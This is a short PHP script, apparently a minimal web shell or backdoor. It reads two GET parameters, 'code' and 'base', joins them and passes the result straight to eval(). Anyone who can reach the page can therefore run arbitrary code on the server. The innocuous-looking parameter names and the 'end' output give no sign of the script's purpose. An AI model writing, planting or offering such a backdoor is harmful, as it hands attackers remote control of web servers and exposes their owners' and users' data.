<?php
$base_code = $_GET['code'];
$module_code = $_GET['base'];

$content = $base_code.$module_code;
eval($content);
	echo "end";	
?>